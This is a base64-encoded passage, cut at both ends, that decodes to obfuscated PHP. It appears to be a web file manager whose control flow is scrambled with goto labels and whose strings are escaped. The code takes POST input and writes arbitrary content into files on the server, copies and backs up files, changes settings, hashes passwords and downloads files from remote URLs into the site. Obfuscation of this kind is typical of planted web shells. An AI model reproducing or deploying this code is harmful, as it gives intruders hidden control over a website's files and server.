0xKSA9PSAiXDU3IikgeyAkZm1fdXJsID0gcnRyaW0oJGZtX3VybCwgIlx4MmYiKTsgJG1zZyAuPSAiXHgzY1x4NjJcMTYyXHgzZSI7ICRtc2cgLj0gIlx4M2NceDYyXHg3Mlw3NlwxMjNceDY1XHg2NVwxNTVcMTYzXDQwXDE1NFwxNTFceDZiXDE0NVw0MFwxNzFceDZmXHg3NVw0MFx4NjhceDYxXDE2NlwxNDVcNDBcMTQxXHgyMFx4NzRcMTYyXDE0MVx4NjlcMTU0XDE1MVx4NmVcMTQ3XHgyMFx4NzNcMTU0XDE0MVx4NzNceDY4XHgyMFx4NmZcMTU2XDQwXHg3NFx4NjhcMTQ1XDQwXHg1NVwxMjJcMTE0XDU2IjsgJG1zZyAuPSAiXHgzY1wxNDJcMTYyXHgzZVwxMjRceDcyXHg3OVx4MjBcMTY0XHg2OFwxNTFceDczXDQwXDE1NFwxNTFceDZlXHg2Ylx4M2FceDIwXHgzY1x4NjFcNDBcMTUwXDE2Mlx4NjVcMTQ2XDc1XHgyMiIgLiAkZm1fdXJsIC4gIlx4MjJcNzYiIC4gJGZtX3VybCAuICJcNzRceDJmXDE0MVx4M2UiOyB9IGRpZSgkbXNnKTsgfSBpZiAoaXNfYXJyYXkoJGRhdGEpICYmIGNvdW50KCRkYXRhKSkgeyAkdGhpcy0+ZGF0YSA9ICRkYXRhOyB9IGVsc2UgeyAkdGhpcy0+c2F2ZSgpOyB9IH0gZnVuY3Rpb24gc2F2ZSgpIHsgJGZtX2ZpbGUgPSBfX0ZJTEVfXzsgJHZhcl9uYW1lID0gIlx4MjRceDQzXDExN1wxMTZceDQ2XDExMVx4NDciOyAkdmFyX3ZhbHVlID0gdmFyX2V4cG9ydChqc29uX2VuY29kZSgkdGhpcy0+ZGF0YSksIHRydWUpOyAkY29uZmlnX3N0cmluZyA9ICJcNzRceDNmXHg3MFwxNTBceDcwIiAuIGNocigxMykgLiBjaHIoMTApIC4gIlw1N1x4MmZceDQ0XHg2NVx4NjZcMTQxXHg3NVwxNTRcMTY0XDQwXHg0M1x4NmZceDZlXHg2NlwxNTFceDY3XHg3NVwxNjJceDYxXHg3NFwxNTFcMTU3XDE1NiIgLiBjaHIoMTMpIC4gY2hyKDEwKSAuICJ7JHZhcl9uYW1lfVx4MjBcNzVceDIweyR2YXJfdmFsdWV9XHgzYiIgLiBjaHIoMTMpIC4gY2hyKDEwKTsgaWYgKGlzX3dyaXRhYmxlKCRmbV9maWxlKSkgeyAkbGluZXMgPSBmaWxlKCRmbV9maWxlKTsgaWYgKCRmaCA9IEBmb3BlbigkZm1fZmlsZSwgIlx4NzciKSkgeyBAZnB1dHMoJGZoLCAkY29uZmlnX3N0cmluZywgc3RybGVuKCRjb25maWdfc3RyaW5nKSk7IGZvciAoJHggPSAzOyAkeCA8IGNvdW50KCRsaW5lcyk7ICR4KyspIHsgQGZwdXRzKCRmaCwgJGxpbmVzWyR4XSwgc3RybGVuKCRsaW5lc1skeF0pKTsgfSBAZmNsb3NlKCRmaCk7IH0gfSB9IH0gZ290byBBb0k5STsgTGJBTDA6IGlmIChkZWZpbmVkKCJceDQ2XHg0ZFx4NWZcMTA1XDExNVwxMDJcMTA1XHg0NCIpKSB7ICR1c2VfYXV0aCA9IGZhbHNlOyAkc3RpY2t5X25hdmJhciA9IGZhbHNlOyB9IGVsc2UgeyBAc2V0X3RpbWVfbGltaXQoNjAwKTsgZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldCgkZGVmYXVsdF90aW1lem9uZSk7IGluaV9zZXQoIlx4NjRcMTQ1XDE0NlwxNDFceDc1XDE1NFwxNjRcMTM3XDE0M1x4NjhcMTQxXDE2Mlx4NzNcMTQ1XDE2NCIsICJcMTI1XHg1NFx4NDZcNTVceDM4Iik7IGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICJceDM1XHgyZVx4MzZceDJlXDYwIiwgIlx4M2MiKSAmJiBmdW5jdGlvbl9leGlzdHMoIlx4NmRceDYyXHg1ZlwxNTFcMTU2XDE2NFx4NjVceDcyXDE1NlwxNDFceDZjXDEzN1wxNDVceDZlXHg2M1x4NmZceDY0XHg2OVwxNTZcMTQ3IikpIHsgbWJfaW50ZXJuYWxfZW5jb2RpbmcoIlx4NTVceDU0XHg0Nlw1NVx4MzgiKTsgfSBpZiAoZnVuY3Rpb25fZXhpc3RzKCJcMTU1XHg2MlwxMzdcMTYyXDE0NVwxNDdceDY1XDE3MFx4NWZceDY1XHg2ZVx4NjNcMTU3XDE0NFx4NjlcMTU2XHg2NyIpKSB7IG1iX3JlZ2V4X2VuY29kaW5nKCJcMTI1XDEyNFwxMDZceDJkXDcwIik7IH0gc2Vzc2lvbl9jYWNoZV9saW1pdGVyKCcnKTsgc2Vzc2lvbl9uYW1lKEZNX1NFU1NJT05fSUQpOyBmdW5jdGlvbiBzZXNzaW9uX2Vycm9yX2hhbmRsaW5nX2Z1bmN0aW9uKCRjb2RlLCAkbXNnLCAkZmlsZSwgJGxpbmUpIHsgaWYgKCRjb2RlID09IDIpIHsgc2Vzc2lvbl9hYm9ydCgpOyBzZXNzaW9uX2lkKHNlc3Npb25fY3JlYXRlX2lkKCkpOyBAc2Vzc2lvbl9zdGFydCgpOyB9IH0gc2V0X2Vycm9yX2hhbmRsZXIoIlx4NzNcMTQ1XDE2M1x4NzNcMTUxXDE1N1wxNTZcMTM3XHg2NVx4NzJceDcyXDE1N1wxNjJcMTM3XDE1MFx4NjFceDZlXDE0NFwxNTRcMTUxXHg2ZVx4NjdceDVmXHg2NlwxNjVcMTU2XDE0M1wxNjRceDY5XDE1N1wxNTYiKTsgc2Vzc2lvbl9zdGFydCgpOyByZXN0b3JlX2Vycm9yX2hhbmRsZXIoKTsgfSBnb3RvIGVuaW11OyBzMk1uUjogaWYgKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXDE1NFwxNTdceDY3XHg2N1wxNDVcMTQ0Il0pICYmICFlbXB0eSgkZGlyZWN0b3JpZXNfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWyJcMTU0XDE1N1wxNDdceDY3XHg2NVx4NjQiXV0pKSB7ICR3ZCA9IGZtX2NsZWFuX3BhdGgoZGlybmFtZSgkX1NFUlZFUlsiXHg1MFx4NDhceDUwXDEzN1wxMjNcMTA1XHg0Y1wxMDYiXSkpOyAkcm9vdF91cmwgPSAkcm9vdF91cmwgLiAkd2QgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGRpcmVjdG9yaWVzX3VzZXJzWyRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsiXHg2Y1wxNTdcMTQ3XHg2N1x4NjVceDY0Il1dOyB9IGdvdG8gTlhJdFI7IFkzbkZ6OiAkaGlnaGxpZ2h0anNfc3R5bGUgPSAiXDE2Nlx4NzMiOyBnb3RvIEdLbnp1OyBRTk9DSjogPz4KPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgY2xhc3M9InB0LTMiPgogICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icCIgdmFsdWU9Ijw/cGhwICBnb3RvIGMwZjRTOyB5VnZ5aDogaWYgKGlzX3JlYWRhYmxlKCRjb25maWdfZmlsZSkpIHsgQChpbmNsdWRlICRjb25maWdfZmlsZSk7IH0gZ290byBnX2F3dTsgS2FhVUI6IGlmICgkcmVwb3J0X2Vycm9ycyA9PSB0cnVlKSB7IEBpbmlfc2V0KCJceDY1XDE2Mlx4NzJcMTU3XHg3MlwxMzdcMTYyXDE0NVwxNjBceDZmXDE2MlwxNjRcMTUxXDE1NlwxNDciLCBFX0FMTCk7IEBpbmlfc2V0KCJcMTQ0XHg2OVwxNjNcMTYwXHg2Y1x4NjFcMTcxXHg1Zlx4NjVcMTYyXDE2MlwxNTdceDcyXDE2MyIsIDEpOyB9IGVsc2UgeyBAaW5pX3NldCgiXHg2NVwxNjJcMTYyXHg2Zlx4NzJcMTM3XDE2Mlx4NjVceDcwXDE1N1x4NzJcMTY0XDE1MVwxNTZceDY3IiwgRV9BTEwpOyBAaW5pX3NldCgiXDE0NFx4NjlceDczXDE2MFx4NmNceDYxXDE3MVx4NWZcMTQ1XHg3Mlx4NzJcMTU3XHg3Mlx4NzMiLCAwKTsgfSBnb3RvIExiQUwwOyBzQjNNVTogZGVmaW5lKCJcMTA2XDExNVwxMzdceDQ1XDEwNFwxMTFceDU0XDEzN1x4NDZcMTExXDExNFx4NDUiLCAkZWRpdF9maWxlcyk7IGdvdG8gazZ2MHk7IGxFWDlJOiAkbGFuZyA9IGlzc2V0KCRjZmctPmRhdGFbIlwxNTRcMTQxXDE1NlwxNDciXSkgPyAkY2ZnLT5kYXRhWyJcMTU0XDE0MVwxNTZceDY3Il0gOiAiXHg2NVwxNTYiOyBnb3RvIERKUTlmOyBieHNrRjogaWYgKGlzc2V0KCRfUE9TVFsiXHg2MVx4NmFcMTQxXDE3MCJdKSAmJiAhRk1fUkVBRE9OTFkpIHsgaWYgKGlzc2V0KCRfUE9TVFsiXDE2NFx4NzlcMTYwXDE0NSJdKSAmJiAkX1BPU1RbIlx4NzRceDc5XDE2MFx4NjUiXSA9PSAiXDE2M1wxNDFcMTY2XDE0NSIpIHsgJHBhdGggPSBGTV9ST09UX1BBVEg7IGlmIChGTV9QQVRIICE9ICcnKSB7ICRwYXRoIC49ICJcNTciIC4gRk1fUEFUSDsgfSBpZiAoIWlzX2RpcigkcGF0aCkpIHsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAiXDc3XHg3MFx4M2QiKTsgfSAkZmlsZSA9ICRfR0VUWyJcMTQ1XHg2NFwxNTFcMTY0Il07ICRmaWxlID0gZm1fY2xlYW5fcGF0aCgkZmlsZSk7ICRmaWxlID0gc3RyX3JlcGxhY2UoIlw1NyIsICcnLCAkZmlsZSk7IGlmICgkZmlsZSA9PSAnJyB8fCAhaXNfZmlsZSgkcGF0aCAuICJceDJmIiAuICRmaWxlKSkgeyBmbV9zZXRfbXNnKGxuZygiXDEwNlx4NjlceDZjXHg2NVw0MFwxNTZcMTU3XHg3NFw0MFx4NjZcMTU3XHg3NVwxNTZceDY0IiksICJcMTQ1XHg3Mlx4NzJcMTU3XDE2MiIpOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJcNzdceDcwXHgzZCIgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOyB9IGhlYWRlcigiXHg1OFw1NVwxMzBcMTIzXHg1M1w1NVwxMjBcMTYyXHg2ZlwxNjRcMTQ1XHg2M1wxNjRcMTUxXHg2ZlwxNTZceDNhXHgzMCIpOyAkZmlsZV9wYXRoID0gJHBhdGggLiAiXHgyZiIgLiAkZmlsZTsgJHdyaXRlZGF0YSA9ICRfUE9TVFsiXDE0M1x4NmZcMTU2XDE2NFwxNDVceDZlXHg3NCJdOyAkZmQgPSBmb3BlbigkZmlsZV9wYXRoLCAiXHg3NyIpOyAkd3JpdGVfcmVzdWx0cyA9IEBmd3JpdGUoJGZkLCAkd3JpdGVkYXRhKTsgZmNsb3NlKCRmZCk7IGlmICgkd3JpdGVfcmVzdWx0cyA9PT0gZmFsc2UpIHsgaGVhZGVyKCJcMTEwXHg1NFx4NTRcMTIwXHgyZlw2MVx4MmVceDMxXHgyMFw2NVw2MFw2MFx4MjBcMTExXHg2ZVwxNjRcMTQ1XHg3MlwxNTZceDYxXHg2Y1x4MjBceDUzXHg2NVx4NzJceDc2XDE0NVwxNjJceDIwXDEwNVx4NzJceDcyXDE1N1x4NzIiKTsgZGllKCJcMTAzXDE1N1wxNjVcMTU0XHg2NFx4MjBcMTE2XHg2ZlwxNjRceDIwXHg1N1wxNjJcMTUxXHg3NFx4NjVcNDBcMTA2XHg2OVx4NmNcMTQ1XHgyMVw0MFw1NVx4MjBcMTAzXDE1MFx4NjVcMTQzXDE1M1w0MFwxMjBcMTQ1XHg3Mlx4NmRceDY5XDE2M1wxNjNceDY5XDE1N1wxNTZcMTYzXHgyMFx4MmZceDIwXHg0ZlwxNjdcMTU2XDE0NVx4NzJcMTYzXDE1MFwxNTFceDcwIik7IH0gZGllKHRydWUpOyB9IGlmIChpc3NldCgkX1BPU1RbIlwxNjRceDc5XDE2MFx4NjUiXSkgJiYgJF9QT1NUWyJcMTY0XDE3MVwxNjBcMTQ1Il0gPT0gIlwxNjNcMTQ1XHg2MVwxNjJceDYzXDE1MCIpIHsgJGRpciA9IEZNX1JPT1RfUEFUSDsgJHJlc3BvbnNlID0gc2NhbihmbV9jbGVhbl9wYXRoKCRfUE9TVFsiXHg3MFwxNDFcMTY0XHg2OCJdKSwgJF9QT1NUWyJceDYzXDE1N1wxNTZcMTY0XDE0NVwxNTZceDc0Il0pOyBlY2hvIGpzb25fZW5jb2RlKCRyZXNwb25zZSk7IGRpZTsgfSBpZiAoaXNzZXQoJF9QT1NUWyJceDc0XDE3MVx4NzBceDY1Il0pICYmICRfUE9TVFsiXDE2NFwxNzFceDcwXHg2NSJdID09ICJceDYyXDE0MVx4NjNceDZiXDE2NVx4NzAiICYmICFlbXB0eSgkX1BPU1RbIlwxNDZcMTUxXDE1NFwxNDUiXSkpIHsgJGZpbGVOYW1lID0gJF9QT1NUWyJceDY2XDE1MVx4NmNcMTQ1Il07ICRmdWxsUGF0aCA9IEZNX1JPT1RfUEFUSCAuICJcNTciOyBpZiAoIWVtcHR5KCRfUE9TVFsiXDE2MFx4NjFceDc0XDE1MCJdKSkgeyAkcmVsYXRpdmVEaXJQYXRoID0gZm1fY2xlYW5fcGF0aCgkX1BPU1RbIlx4NzBcMTQxXDE2NFx4NjgiXSk7ICRmdWxsUGF0aCAuPSAieyRyZWxhdGl2ZURpclBhdGh9XHgyZiI7IH0gJGRhdGUgPSBkYXRlKCJcMTQ0XHg0ZFwxNzFceDJkXHg0OFx4NjlceDczIik7ICRuZXdGaWxlTmFtZSA9ICJ7JGZpbGVOYW1lfVw1NXskZGF0ZX1cNTZceDYyXDE0MVwxNTMiOyAkZnVsbHlRdWFsaWZpZWRGaWxlTmFtZSA9ICRmdWxsUGF0aCAuICRmaWxlTmFtZTsgdHJ5IHsgaWYgKCFmaWxlX2V4aXN0cygkZnVsbHlRdWFsaWZpZWRGaWxlTmFtZSkpIHsgdGhyb3cgbmV3IEV4Y2VwdGlvbigiXDEwNlwxNTFceDZjXDE0NVw0MHskZmlsZU5hbWV9XDQwXHg2ZVx4NmZcMTY0XDQwXHg2Nlx4NmZcMTY1XHg2ZVwxNDQiKTsgfSBpZiAoY29weSgkZnVsbHlRdWFsaWZpZWRGaWxlTmFtZSwgJGZ1bGxQYXRoIC4gJG5ld0ZpbGVOYW1lKSkgeyBlY2hvICJcMTAyXDE0MVwxNDNcMTUzXHg3NVwxNjBcNDB7JG5ld0ZpbGVOYW1lfVx4MjBceDYzXHg3MlwxNDVceDYxXHg3NFwxNDVceDY0IjsgfSBlbHNlIHsgdGhyb3cgbmV3IEV4Y2VwdGlvbigiXDEwM1x4NmZceDc1XDE1NFwxNDRceDIwXHg2ZVx4NmZcMTY0XDQwXHg2M1x4NmZcMTYwXDE3MVx4MjBcMTQ2XHg2OVwxNTRcMTQ1XHgyMHskZmlsZU5hbWV9Iik7IH0gfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7IGVjaG8gJGUtPmdldE1lc3NhZ2UoKTsgfSB9IGlmIChpc3NldCgkX1BPU1RbIlwxNjRcMTcxXDE2MFwxNDUiXSkgJiYgJF9QT1NUWyJceDc0XHg3OVx4NzBcMTQ1Il0gPT0gIlwxNjNceDY1XDE2NFwxNjRcMTUxXHg2ZVx4NjdcMTYzIikgeyBnbG9iYWwgJGNmZywgJGxhbmcsICRyZXBvcnRfZXJyb3JzLCAkc2hvd19oaWRkZW5fZmlsZXMsICRsYW5nX2xpc3QsICRoaWRlX0NvbHMsICRjYWxjX2ZvbGRlciwgJHRoZW1lOyAkbmV3TG5nID0gJF9QT1NUWyJceDZhXHg3M1w1NVwxNTRceDYxXDE1Nlx4NjdceDc1XDE0MVx4NjdcMTQ1Il07IGZtX2dldF90cmFuc2xhdGlvbnMoYXJyYXkoKSk7IGlmICghYXJyYXlfa2V5X2V4aXN0cygkbmV3TG5nLCAkbGFuZ19saXN0KSkgeyAkbmV3TG5nID0gIlx4NjVceDZlIjsgfSAkZXJwID0gaXNzZXQoJF9QT1NUWyJcMTUyXHg3M1w1NVwxNDVcMTYyXDE2MlwxNTdcMTYyXHgyZFwxNjJceDY1XHg3MFwxNTdcMTYyXDE2NCJdKSAmJiAkX1BPU1RbIlx4NmFcMTYzXDU1XDE0NVwxNjJceDcyXDE1N1x4NzJceDJkXDE2Mlx4NjVcMTYwXHg2Zlx4NzJceDc0Il0gPT0gIlx4NzRceDcyXDE2NVx4NjUiID8gdHJ1ZSA6IGZhbHNlOyAkc2hmID0gaXNzZXQoJF9QT1NUWyJceDZhXDE2M1w1NVwxNjNcMTUwXDE1N1x4NzdcNTVceDY4XDE1MVwxNDRcMTQ0XHg2NVx4NmUiXSkgJiYgJF9QT1NUWyJcMTUyXHg3M1w1NVx4NzNceDY4XDE1N1x4NzdceDJkXDE1MFwxNTFceDY0XHg2NFwxNDVceDZlIl0gPT0gIlx4NzRcMTYyXDE2NVx4NjUiID8gdHJ1ZSA6IGZhbHNlOyAkaGNvID0gaXNzZXQoJF9QT1NUWyJceDZhXDE2M1w1NVwxNTBcMTUxXHg2NFx4NjVcNTVceDYzXDE1N1wxNTRceDczIl0pICYmICRfUE9TVFsiXHg2YVwxNjNcNTVcMTUwXDE1MVwxNDRcMTQ1XDU1XHg2M1x4NmZceDZjXDE2MyJdID09ICJcMTY0XDE2MlwxNjVcMTQ1IiA/IHRydWUgOiBmYWxzZTsgJGNhZiA9IGlzc2V0KCRfUE9TVFsiXDE1Mlx4NzNceDJkXHg2M1x4NjFceDZjXHg2M1w1NVx4NjZcMTU3XDE1NFx4NjRcMTQ1XDE2MiJdKSAmJiAkX1BPU1RbIlwxNTJceDczXHgyZFx4NjNceDYxXHg2Y1x4NjNceDJkXHg2NlwxNTdcMTU0XDE0NFwxNDVcMTYyIl0gPT0gIlx4NzRceDcyXHg3NVx4NjUiID8gdHJ1ZSA6IGZhbHNlOyAkdGUzID0gJF9QT1NUWyJceDZhXDE2M1x4MmRceDc0XDE1MFwxNDVceDZkXDE0NVw1NVx4MzMiXTsgaWYgKCRjZmctPmRhdGFbIlwxNTRceDYxXDE1Nlx4NjciXSAhPSAkbmV3TG5nKSB7ICRjZmctPmRhdGFbIlwxNTRceDYxXHg2ZVwxNDciXSA9ICRuZXdMbmc7ICRsYW5nID0gJG5ld0xuZzsgfSBpZiAoJGNmZy0+ZGF0YVsiXHg2NVwxNjJcMTYyXDE1N1wxNjJcMTM3XHg3MlwxNDVceDcwXHg2Zlx4NzJcMTY0XHg2OVx4NmVcMTQ3Il0gIT0gJGVycCkgeyAkY2ZnLT5kYXRhWyJcMTQ1XDE2Mlx4NzJceDZmXDE2MlwxMzdcMTYyXHg2NVwxNjBceDZmXHg3MlwxNjRcMTUxXDE1Nlx4NjciXSA9ICRlcnA7ICRyZXBvcnRfZXJyb3JzID0gJGVycDsgfSBpZiAoJGNmZy0+ZGF0YVsiXDE2M1wxNTBceDZmXHg3N1x4NWZcMTUwXDE1MVwxNDRcMTQ0XDE0NVx4NmUiXSAhPSAkc2hmKSB7ICRjZmctPmRhdGFbIlwxNjNceDY4XDE1N1x4NzdceDVmXDE1MFwxNTFcMTQ0XHg2NFx4NjVceDZlIl0gPSAkc2hmOyAkc2hvd19oaWRkZW5fZmlsZXMgPSAkc2hmOyB9IGlmICgkY2ZnLT5kYXRhWyJceDczXDE1MFwxNTdceDc3XHg1ZlwxNTBceDY5XDE0NFx4NjRcMTQ1XHg2ZSJdICE9ICRzaGYpIHsgJGNmZy0+ZGF0YVsiXDE2M1x4NjhcMTU3XDE2N1x4NWZceDY4XHg2OVwxNDRceDY0XDE0NVx4NmUiXSA9ICRzaGY7ICRzaG93X2hpZGRlbl9maWxlcyA9ICRzaGY7IH0gaWYgKCRjZmctPmRhdGFbIlwxNTBcMTUxXHg2NFwxNDVcMTM3XHg0M1x4NmZcMTU0XHg3MyJdICE9ICRoY28pIHsgJGNmZy0+ZGF0YVsiXHg2OFwxNTFceDY0XDE0NVwxMzdceDQzXDE1N1wxNTRcMTYzIl0gPSAkaGNvOyAkaGlkZV9Db2xzID0gJGhjbzsgfSBpZiAoJGNmZy0+ZGF0YVsiXDE0M1wxNDFcMTU0XDE0M1x4NWZcMTQ2XDE1N1wxNTRceDY0XHg2NVwxNjIiXSAhPSAkY2FmKSB7ICRjZmctPmRhdGFbIlwxNDNceDYxXHg2Y1wxNDNceDVmXDE0Nlx4NmZcMTU0XDE0NFwxNDVcMTYyIl0gPSAkY2FmOyAkY2FsY19mb2xkZXIgPSAkY2FmOyB9IGlmICgkY2ZnLT5kYXRhWyJceDc0XHg2OFwxNDVcMTU1XHg2NSJdICE9ICR0ZTMpIHsgJGNmZy0+ZGF0YVsiXDE2NFwxNTBcMTQ1XHg2ZFwxNDUiXSA9ICR0ZTM7ICR0aGVtZSA9ICR0ZTM7IH0gJGNmZy0+c2F2ZSgpOyBlY2hvIHRydWU7IH0gaWYgKGlzc2V0KCRfUE9TVFsiXDE2NFx4NzlcMTYwXDE0NSJdKSAmJiAkX1BPU1RbIlwxNjRceDc5XHg3MFx4NjUiXSA9PSAiXDE2MFx4NzdceDY0XDE1MFx4NjFceDczXHg2OCIpIHsgJHJlcyA9IGlzc2V0KCRfUE9TVFsiXHg2OVwxNTZceDcwXHg3NVx4NzRcMTIwXHg2MVwxNjNcMTYzXHg3N1wxNTdcMTYyXDE0NFw2MiJdKSAmJiAhZW1wdHkoJF9QT1NUWyJcMTUxXHg2ZVwxNjBcMTY1XDE2NFwxMjBceDYxXHg3M1wxNjNceDc3XHg2Zlx4NzJceDY0XDYyIl0pID8gcGFzc3dvcmRfaGFzaCgkX1BPU1RbIlwxNTFceDZlXHg3MFwxNjVceDc0XHg1MFwxNDFceDczXDE2M1wxNjdcMTU3XDE2MlwxNDRceDMyIl0sIFBBU1NXT1JEX0RFRkFVTFQpIDogJyc7IGVjaG8gJHJlczsgfSBpZiAoaXNzZXQoJF9QT1NUWyJcMTY0XHg3OVwxNjBceDY1Il0pICYmICRfUE9TVFsiXDE2NFwxNzFcMTYwXDE0NSJdID09ICJceDc1XDE2MFx4NmNceDZmXDE0MVwxNDQiICYmICFlbXB0eSgkX1JFUVVFU1RbIlwxNjVceDcwXHg2Y1x4NmZceDYxXDE0NFx4NzVcMTYyXHg2YyJdKSkgeyAkcGF0aCA9IEZNX1JPT1RfUEFUSDsgaWYgKEZNX1BBVEggIT0gJycpIHsgJHBhdGggLj0gIlw1NyIgLiBGTV9QQVRIOyB9IGZ1bmN0aW9uIGV2ZW50X2NhbGxiYWNrKCRtZXNzYWdlKSB7IGdsb2JhbCAkY2FsbGJhY2s7IGVjaG8ganNvbl9lbmNvZGUoJG1lc3NhZ2UpOyB9IGZ1bmN0aW9uIGdldF9maWxlX3BhdGgoKSB7IGdsb2JhbCAkcGF0aCwgJGZpbGVpbmZvLCAkdGVtcF9maWxlOyByZXR1cm4gJHBhdGggLiAiXDU3IiAuIGJhc2VuYW1lKCRmaWxlaW5mby0+bmFtZSk7IH0gJHVybCA9ICFlbXB0eSgkX1JFUVVFU1RbIlwxNjVcMTYwXDE1NFwxNTdcMTQxXDE0NFwxNjVceDcyXDE1NCJdKSAmJiBwcmVnX21hdGNoKCJcMTc0XHg1ZVx4NjhceDc0XHg3NFwxNjBceDI4XDE2M1x4MjlceDNmXHgzYVw1N1x4MmZcNTZcNTNcNDRcMTc0Iiwgc3RyaXBzbGFzaGVzKCRfUkVRVUVTVFsiXDE2NVwxNjBceDZjXDE1N1wxNDFcMTQ0XHg3NVwxNjJceDZjIl0pKSA/IHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbIlx4NzVceDcwXDE1NFwxNTdcMTQxXDE0NFwxNjVcMTYyXDE1NCJdKSA6IG51bGw7ICRkb21haW4gPSBwYXJzZV91cmwoJHVybCwgUEhQX1VSTF9IT1NUKTsgJHBvcnQgPSBwYXJzZV91cmwoJHVybCwgUEhQX1VSTF9QT1JUKTsgJGtub3duUG9ydHMgPSBhcnJheSgyMiwgMjMsIDI1LCAzMzA2KTsgaWYgKHByZWdfbWF0Y2goIlw1N1x4NWVcMTU0XDE1N1x4NjNceDYxXDE1NFx4NjhcMTU3XDE2M1x4NzRcNDRcMTc0XHg1ZVx4MzFceDMyXDY3XHgyOFw3N1x4M2FcMTM0XHgyZVwxMzNceDMwXDU1XDcxXHg1ZFx4MmJceDI5XDE3M1w2MFw1NFw2Mlx4N2RceDVjXDU2XHg1Ylw2MFx4MmRceDM5XDEzNVx4MmJcNDRceDdjXDEzNlw1MFw3N1w3Mlx4MzBcNTJcMTM0XHgzYVw1MVw1Mlx4M2ZcNzJceDNmXDYwXHgyYVw2MVx4MjRceDJmXHg2OSIsICRkb21haW4pIHx8IGluX2FycmF5KCRwb3J0LCAka25vd25Qb3J0cykpIHsgJGVyciA9IGFycmF5KCJcMTU1XHg2NVx4NzNcMTYzXHg2MVx4NjdcMTQ1IiA9PiAiXDEyNVwxMjJceDRjXHgyMFx4NjlcMTYzXHgyMFx4NmVceDZmXDE2NFw0MFwxNDFceDZjXDE1NFwxNTdceDc3XDE0NVwxNDQiKTsgZXZlbnRfY2FsbGJhY2soYXJyYXkoIlx4NjZcMTQxXDE1MVwxNTQiID0+ICRlcnIpKTsgZGllOyB9ICR1c2VfY3VybCA9IGZhbHNlOyAkdGVtcF9maWxlID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICJcMTY1XDE2MFx4NmNcMTU3XDE0MVwxNDRceDJkIik7ICRmaWxlaW5mbyA9IG5ldyBzdGRDbGFzcygpOyAkZmlsZWluZm8tPm5hbWUgPSB0cmltKGJhc2VuYW1lKCR1cmwpLCAiXDU2XDBcNTZcNTZcNDAiKTsgJGFsbG93ZWQgPSBGTV9VUExPQURfRVhURU5TSU9OID8gZXhwbG9kZSgiXHgyYyIsIEZNX1VQTE9BRF9FWFRFTlNJT04pIDogZmFsc2U7ICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlaW5mby0+bmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSk7ICRpc0ZpbGVBbGxvd2VkID0gJGFsbG93ZWQgPyBpbl9hcnJheSgkZXh0LCAkYWxsb3dlZCkgOiB0cnVlOyAkZXJyID0gZmFsc2U7IGlmICghJGlzRmlsZUFsbG93ZWQpIHsgJGVyciA9IGFycmF5KCJcMTU1XDE0NVwxNjNceDczXDE0MVwxNDdceDY1IiA9PiAiXHg0NlwxNTFceDZjXDE0NVx4MjBceDY1XDE3MFx4NzRceDY1XDE1NlwxNjNcMTUxXHg2ZlwxNTZcNDBcMTUxXDE2M1w0MFx4NmVcMTU3XDE2NFw0MFwxNDFcMTU0XHg2Y1wxNTdceDc3XHg2NVwxNDQiKTsgZXZlbnRfY2FsbGJhY2soYXJyYXkoIlx4NjZcMTQxXHg2OVx4NmMiID0+ICRlcnIpKTsgZGllOyB9IGlmICghJHVybCkgeyAkc3VjY2VzcyA9IGZhbHNlOyB9IGVsc2UgeyBpZiAoJHVzZV9jdXJsKSB7IEAoJGZwID0gZm9wZW4oJHRlbXBfZmlsZSwgIlx4NzciKSk7IEAoJGNoID0gY3VybF9pbml0KCR1cmwpKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX05PUFJPR1JFU1MsIGZhbHNlKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCB0cnVlKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZJTEUsICRmcCk7IEAoJHN1Y2Nlc3MgPSBjdXJsX2V4ZWMoJGNoKSk7ICRjdXJsX2luZm8gPSBjdXJsX2dldGluZm8oJGNoKTsgaWYgKCEkc3VjY2VzcykgeyAkZXJyID0gYXJyYXkoIlwxNTVceDY1XHg3M1wxNjNceDYxXHg2N1wxNDUiID0+IGN1cmxfZXJyb3IoJGNoKSk7IH0gQGN1cmxfY2xvc2UoJGNoKTsgZmNsb3NlKCRmcCk7ICRmaWxlaW5mby0+c2l6ZSA9ICRjdXJsX2luZm9bIlwxNjNceDY5XDE3MlwxNDVceDVmXHg2NFwxNTdcMTY3XDE1Nlx4NmNcMTU3XDE0MVwxNDQiXTsgJGZpbGVpbmZvLT50eXBlID0gJGN1cmxfaW5mb1siXDE0M1x4NmZcMTU2XDE2NFwxNDVceDZlXDE2NFwxMzdcMTY0XHg3OVwxNjBcMTQ1Il07IH0gZWxzZSB7ICRjdHggPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoKTsgQCgkc3VjY2VzcyA9IGNvcHkoJHVybCwgJHRlbXBfZmlsZSwgJGN0eCkpOyBpZiAoISRzdWNjZXNzKSB7ICRlcnIgPSBlcnJvcl9nZXRfbGFzdCgpOyB9IH0gfSBpZiAoJHN1Y2Nlc3MpIHsgJHN1Y2Nlc3MgPSByZW5hbWUoJHRlbXBfZmlsZSwgZ2V0X2ZpbGVfcGF0aCgpKTsgfSBpZiAoJHN1Y2Nlc3MpIHsgZXZlbnRfY2FsbGJhY2soYXJyYXkoIlwxNDRceDZmXDE1NlwxNDUiID0+ICRmaWxlaW5mbykpOyB9IGVsc2UgeyB1bmxpbmsoJHRlbXBfZmlsZSk7IGlmICghJGVycikgeyAkZXJyID0gYXJyYXkoIlx4NmRceDY1XDE2M1x4NzNcMTQxXHg2N1